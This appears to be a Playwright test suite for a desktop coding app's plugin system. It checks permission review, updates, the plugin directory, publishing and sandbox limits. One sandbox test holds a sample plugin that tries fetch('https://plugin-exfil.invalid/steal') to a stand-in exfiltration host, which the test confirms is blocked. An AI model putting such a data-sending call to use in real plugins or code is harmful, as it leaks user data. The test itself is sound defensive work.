import { test, expect, type Page } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";
import { boot } from "./fixture";

async function pluginFixture(
  page: Page,
  source: string,
  permissions: string[] = [],
) {
  await page.evaluate(
    ({ source, permissions }) => {
      const w = window as any;
      const manifest = {
        apiVersion: 1,
        id: "test.plugin",
        name: "Test tools",
        version: "1.0.0",
        description: "Useful local commands.",
        author: "Test author",
        entry: "index.js",
        permissions,
        commands: [
          {
            id: "test-command",
            title: "Test command",
            description: "A test command.",
          },
        ],
      };
      const plugin = {
        manifest,
        enabled: true,
        digest: "reviewed-code",
        origin: { repository: "test/tools", commit: "a".repeat(40) },
      };
      w.qa.plugins = [plugin];
      w.qa.catalog = {
        catalog: {
          schemaVersion: 1,
          plugins: [
            { manifest, repository: "test/tools", commit: "a".repeat(40) },
          ],
        },
        fetched_at: 1,
        notice: null,
      };
      const original = w.__TAURI_INTERNALS__.invoke;
      w.__TAURI_INTERNALS__.invoke = async (cmd: string, args: any) => {
        if (!cmd.startsWith("plugins_")) return original(cmd, args);
        w.qa.calls.push({ cmd, args });
        if (cmd === "plugins_catalog") {
          if (w.qa.catalogError) throw w.qa.catalogError;
          return structuredClone(w.qa.catalog);
        }
        if (cmd === "plugins_list") return structuredClone(w.qa.plugins);
        if (cmd === "plugins_preview")
          return w.qa.nextPreview || { ...plugin, bytes: source.length };
        if (cmd === "plugins_install") {
          if (w.qa.nextPreview) Object.assign(plugin, w.qa.nextPreview);
          w.qa.plugins = [plugin];
          return;
        }
        if (cmd === "plugins_enable") {
          plugin.enabled = args.enabled;
          return;
        }
        if (cmd === "plugins_remove") {
          w.qa.plugins = [];
          return;
        }
        if (cmd === "plugins_source") {
          if (!plugin.enabled) throw "Plugin is disabled.";
          return { manifest, source };
        }
        if (cmd === "plugins_call") return "file contents";
      };
    },
    { source, permissions },
  );
}
async function run(page: Page) {
  return page.evaluate(async () => {
    const { runPlugin } = await import("/src/pluginRuntime.ts");
    return runPlugin({
      id: "test.plugin",
      command: "test-command",
      input: "hello",
      workspace: "C:\\QA",
      messages: () => [{ role: "user", text: "private conversation" }],
      signal: new AbortController().signal,
    });
  });
}

test("plugins review permissions, run on demand, append to draft and disable", async ({
  page,
}) => {
  await boot(page);
  await pluginFixture(
    page,
    `self.VelumPlugin = {commands:{'test-command':async(api,input)=>({title:'Result',text:input+': '+await api.workspace.readText('readme.md')})}}`,
    ["workspace.read"],
  );
  await page
    .locator(".chat-wrap:not(.hidden) textarea")
    .fill("Keep this draft");
  await page.getByRole("button", { name: "Plugins", exact: true }).click();
  await page
    .getByRole("button", { name: "Install from GitHub", exact: true })
    .click();
  await page.getByLabel("GitHub repository").fill("test/tools");
  await page.getByRole("button", { name: "Review plugin" }).click();
  await expect(page.locator(".plugin-review")).toContainText("Read text files");
  expect(
    await page.evaluate(
      () =>
        (window as any).qa.calls.filter((c: any) => c.cmd === "plugins_source")
          .length,
    ),
  ).toBe(0);
  await page
    .getByRole("button", { name: "Allow and install", exact: true })
    .click();
  await expect(
    page.getByRole("switch", { name: "Enable Test tools" }),
  ).toBeChecked();
  await page
    .getByRole("button", { name: "Test command", exact: false })
    .click();
  await page.getByLabel("Command input").fill("summary");
  await page.getByRole("button", { name: "Run command", exact: true }).click();
  await expect(page.locator(".plugin-result")).toContainText(
    "summary: file contents",
  );
  await expect(
    page.locator('iframe[title="Plugin command sandbox"]'),
  ).toHaveCount(0);
  expect(
    (await new AxeBuilder({ page }).include(".plugin-panel").analyze())
      .violations,
  ).toEqual([]);
  await page.getByRole("button", { name: "Add to draft" }).click();
  await expect(page.locator(".chat-wrap:not(.hidden) textarea")).toHaveValue(
    "Keep this draft\n\nsummary: file contents",
  );
  expect(
    await page.evaluate(() =>
      (window as any).qa.calls.some((c: any) => c.cmd === "agent_send"),
    ),
  ).toBe(false);
  await page.getByRole("button", { name: "Plugins", exact: true }).click();
  await page.getByRole("button", { name: /^Installed \(/ }).click();
  await page.getByRole("switch", { name: "Enable Test tools" }).click();
  await expect(
    page.getByRole("button", { name: "Test command", exact: false }),
  ).toBeDisabled();
});

test("GitHub updates are reviewed with commit and new permissions before installation", async ({
  page,
}) => {
  await boot(page);
  await pluginFixture(page, "self.VelumPlugin={commands:{}}");
  await page.getByRole("button", { name: "Plugins", exact: true }).click();
  await page
    .getByRole("button", { name: "Install from GitHub", exact: true })
    .click();
  await page.getByLabel("GitHub repository").fill("test/tools");
  await page.getByRole("button", { name: "Review plugin" }).click();
  await page
    .getByRole("button", { name: "Allow and install", exact: true })
    .click();
  await page
    .getByRole("button", { name: "Check for updates", exact: true })
    .click();
  await expect(page.getByRole("status")).toContainText("up to date");
  await page.getByRole("button", { name: /^Installed \(/ }).click();
  await page.evaluate(() => {
    const w = window as any;
    const p = w.qa.plugins[0];
    w.qa.nextPreview = {
      ...p,
      bytes: 100,
      digest: "updated-code",
      manifest: { ...p.manifest, version: "2.0.0", permissions: ["storage"] },
      origin: { repository: "test/tools", commit: "b".repeat(40) },
    };
  });
  await page
    .getByRole("button", { name: "Check for updates", exact: true })
    .click();
  await expect(page.locator(".plugin-review")).toContainText("bbbbbbb");
  await expect(page.locator(".plugin-review")).toContainText("New permission");
  expect(
    await page.evaluate(
      () =>
        (window as any).qa.calls.filter((c: any) => c.cmd === "plugins_install")
          .length,
    ),
  ).toBe(1);
  await page
    .getByRole("button", { name: "Allow and install update", exact: true })
    .click();
  await expect(page.locator(".plugin-card")).toContainText("v2.0.0");
  expect(
    await page.evaluate(
      () =>
        (window as any).qa.calls
          .filter((c: any) => c.cmd === "plugins_install")
          .at(-1).args,
    ),
  ).toEqual({ repository: "test/tools", reviewedDigest: "updated-code" });
});

test("plugin directory opens first, searches metadata and reviews the listed commit", async ({
  page,
}) => {
  await boot(page);
  await pluginFixture(page, "self.VelumPlugin={commands:{}}");
  expect(
    await page.evaluate(() =>
      (window as any).qa.calls.some((c: any) => c.cmd === "plugins_catalog"),
    ),
  ).toBe(false);
  await page.getByRole("button", { name: "Plugins", exact: true }).click();
  await expect(page.locator(".plugin-listing h3")).toHaveText("Test tools");
  await expect(
    page.getByLabel("GitHub repository", { exact: true }),
  ).toHaveCount(0);
  await page.getByLabel("Search plugins").fill("missing");
  await expect(page.getByText("No matching plugins")).toBeVisible();
  await page.getByLabel("Search plugins").fill("test author");
  await expect(page.locator(".plugin-listing")).toHaveCount(1);
  expect(
    (await new AxeBuilder({ page }).include(".plugin-panel").analyze())
      .violations,
  ).toEqual([]);
  await page.screenshot({
    path: ".qa/plugin-directory.png",
    animations: "disabled",
  });
  await page.getByRole("button", { name: "Install", exact: true }).click();
  await expect(page.locator(".plugin-review")).toContainText("aaaaaaa");
  expect(
    await page.evaluate(
      () =>
        (window as any).qa.calls
          .filter((c: any) => c.cmd === "plugins_preview")
          .at(-1).args,
    ),
  ).toEqual({ repository: "test/tools", commit: "a".repeat(40) });
  expect(
    await page.evaluate(() =>
      (window as any).qa.calls.some(
        (c: any) => c.cmd === "plugins_install" || c.cmd === "plugins_source",
      ),
    ),
  ).toBe(false);
});
test("publish checks the repository and opens a prefilled GitHub submission without posting", async ({
  page,
}) => {
  await boot(page);
  await pluginFixture(page, "self.VelumPlugin={commands:{}}", [
    "workspace.read",
  ]);
  await page.getByRole("button", { name: "Plugins", exact: true }).click();
  await page
    .getByRole("button", { name: "Publish your plugin", exact: true })
    .click();
  await expect(
    page.getByRole("button", { name: "Continue on GitHub", exact: false }),
  ).toHaveCount(0);
  await page.getByLabel("Your plugin repository").fill("test/tools");
  await page
    .getByRole("button", { name: "Check repository", exact: true })
    .click();
  await expect(page.locator(".plugin-publish .plugin-review")).toContainText(
    "Read text files",
  );
  expect(
    (await new AxeBuilder({ page }).include(".plugin-panel").analyze())
      .violations,
  ).toEqual([]);
  await page.screenshot({
    path: ".qa/plugin-publish.png",
    animations: "disabled",
  });
  await page
    .getByRole("button", { name: "Continue on GitHub", exact: false })
    .click();
  await expect(page.getByRole("status")).toContainText(
    "Submission opened on GitHub",
  );
  const args = await page.evaluate(
    () =>
      (window as any).qa.calls
        .filter((c: any) => c.cmd === "plugin:opener|open_url")
        .at(-1).args,
  );
  const url = new URL(args.url);
  expect(url.origin + url.pathname).toBe(
    "https://github.com/velumix/velum-code-plugins/issues/new",
  );
  expect(url.searchParams.get("repository")).toBe("test/tools");
  expect(url.searchParams.get("commit")).toBe("a".repeat(40));
  expect(url.searchParams.get("template")).toBe("plugin.yml");
  expect(
    await page.evaluate(() =>
      (window as any).qa.calls.some(
        (c: any) => c.cmd === "plugins_install" || c.cmd === "agent_send",
      ),
    ),
  ).toBe(false);
});
test("offline directory explains its saved list and allows explicit refresh", async ({
  page,
}) => {
  await boot(page);
  await pluginFixture(page, "self.VelumPlugin={commands:{}}");
  await page.evaluate(
    () =>
      ((window as any).qa.catalog.notice =
        "Could not refresh the directory. Showing your saved list; installed plugins still work."),
  );
  await page.getByRole("button", { name: "Plugins", exact: true }).click();
  await expect(page.getByRole("status")).toContainText("saved list");
  await expect(page.locator(".plugin-listing")).toHaveCount(1);
  await page.evaluate(() => ((window as any).qa.catalog.notice = null));
  await page
    .getByRole("button", { name: "Refresh plugin directory", exact: true })
    .click();
  await expect(page.getByRole("status")).toHaveCount(0);
  expect(
    await page.evaluate(
      () =>
        (window as any).qa.calls
          .filter((c: any) => c.cmd === "plugins_catalog")
          .at(-1).args.refresh,
    ),
  ).toBe(true);
});

test("plugin worker cannot reach network, app storage or native IPC", async ({
  page,
}) => {
  await boot(page);
  let requests = 0;
  page.on("request", (r) => {
    if (r.url().includes("plugin-exfil.invalid")) requests++;
  });
  await pluginFixture(
    page,
    `self.VelumPlugin = {commands:{'test-command':async()=>{
    const blocked=[];
    try{await fetch('https://plugin-exfil.invalid/steal')}catch{blocked.push('network')}
    try{indexedDB.open('app')}catch{blocked.push('storage')}
    if(typeof __TAURI_INTERNALS__==='undefined')blocked.push('native');
    if(typeof document==='undefined')blocked.push('DOM');
    return {text:blocked.join(',')};
  }}}`,
  );
  expect((await run(page)).text).toBe("network,storage,native,DOM");
  expect(requests).toBe(0);
  await expect(page.locator("iframe")).toHaveCount(0);
});

test("plugin host rejects undeclared permissions and oversized output", async ({
  page,
}) => {
  await boot(page);
  await pluginFixture(
    page,
    `self.VelumPlugin = {commands:{'test-command':async(api)=>{try{await api.conversation.messages()}catch(e){return {text:e.message}}}}}`,
  );
  expect((await run(page)).text).toContain(
    "Permission required: conversation.read",
  );
  await pluginFixture(
    page,
    `self.VelumPlugin = {commands:{'test-command':()=>({text:'x'.repeat(40000)})}}`,
  );
  await expect(run(page)).rejects.toThrow("32 KB");
  await expect(page.locator("iframe")).toHaveCount(0);
});

test("infinite plugin loop times out while the app stays responsive", async ({
  page,
}) => {
  await boot(page);
  await pluginFixture(
    page,
    `self.VelumPlugin = {commands:{'test-command':()=>{while(true){}}}}`,
  );
  const result = run(page).then(
    () => "",
    (e) => String(e),
  );
  await expect(page.locator("iframe")).toHaveCount(1);
  await page
    .locator(".chat-wrap:not(.hidden) textarea")
    .fill("Still responsive");
  await expect(page.locator(".chat-wrap:not(.hidden) textarea")).toHaveValue(
    "Still responsive",
  );
  expect(await result).toContain("5-second");
  await expect(page.locator("iframe")).toHaveCount(0);
  await expect.poll(() => page.workers().length).toBe(0);
  await pluginFixture(
    page,
    `self.VelumPlugin = {commands:{'test-command':()=>({text:'Recovered'})}}`,
  );
  expect((await run(page)).text).toBe("Recovered");
  await expect.poll(() => page.workers().length).toBe(0);
});

test("desktop tabs and drafts survive reload with provider resume requested", async ({
  page,
}) => {
  await boot(page);
  const firstId = await page
    .getByRole("tab")
    .first()
    .getAttribute("data-session-id");
  await page.locator(".chat-wrap:not(.hidden) textarea").fill("First draft");
  await page
    .getByRole("button", { name: "New session (Ctrl+T)", exact: true })
    .click();
  await expect(page.locator(".chat-wrap:not(.hidden) textarea")).toBeEnabled();
  await page.locator(".chat-wrap:not(.hidden) textarea").fill("Second draft");
  await page.reload();
  await expect(page.getByRole("tab")).toHaveCount(2);
  await expect(page.locator(".chat-wrap:not(.hidden) textarea")).toHaveValue(
    "Second draft",
  );
  await page.getByRole("tab").first().click();
  await expect(page.locator(".chat-wrap:not(.hidden) textarea")).toHaveValue(
    "First draft",
  );
  expect(
    await page.getByRole("tab").first().getAttribute("data-session-id"),
  ).toBe(firstId);
  expect(
    await page.evaluate(() =>
      (window as any).qa.calls
        .filter((c: any) => c.cmd === "agent_new")
        .every((c: any) => c.args.resume),
    ),
  ).toBe(true);
  await page.getByRole("tab").first().press("Delete");
  await page.reload();
  await expect(page.getByRole("tab")).toHaveCount(1);
  await expect(page.locator(".chat-wrap:not(.hidden) textarea")).toHaveValue(
    "Second draft",
  );
});
